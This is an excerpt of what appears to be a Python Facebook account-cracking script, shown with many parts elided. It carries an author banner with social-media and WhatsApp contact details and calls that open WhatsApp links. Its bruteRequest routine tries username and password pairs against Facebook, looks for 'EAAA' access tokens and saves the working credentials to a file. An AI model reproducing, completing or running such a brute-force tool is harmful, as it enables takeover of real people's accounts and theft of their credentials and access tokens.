...
\x1b[1;97m   ╔╗ ╔═╗╦  ╔═╗╔═╗╦ ╦
   ╠╩╗╠═╣║  ║ ║║  ╠═╣
   ╚═╝╩ ╩╩═╝╚═╝╚═╝╩ ╩    \x1b[1;91m[√] \x1b[1;97mWaQaR \x1b[1;91m[√]
\x1b[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \x1b[1;97m[•] \x1b[1;92mAuthur    :  \x1b[1;97mWaQaR AJ    
 \x1b[1;97m[•] \x1b[1;92mFacebook  :  \x1b[1;97mfb.com/WaQaR AJ  
 \x1b[1;97m[•] \x1b[1;92mWhatsapp  :  \x1b[1;97m+92313**8**4     
...
def country():
    os.system("clear")
    banner()
    print("\n%s%s \x1b[1;91m𝙞𝙛 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙙 𝙞 𝙖𝙢 𝙮𝙤𝙪𝙧 𝙙𝙖𝙙 %s\n"%(k,p,k))
...
def choose_country():
    ...
    if cc in[""]:
        ...
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
def logs():
  os.system('xdg-open https://wa.me/+92313**8**4')
  os.system("clear")
  banner()
...
def menu():
    ...
    if "id" in ngr:
        ...
        negara = "USA"
    os.system('xdg-open https://wa.me/+923470336477')
    os.system("clear")
    banner()
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[1;92m[\x1b[1;92mBaloch_CP\x1b[1;92m] %s • %s • %s\x1b[1;92m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
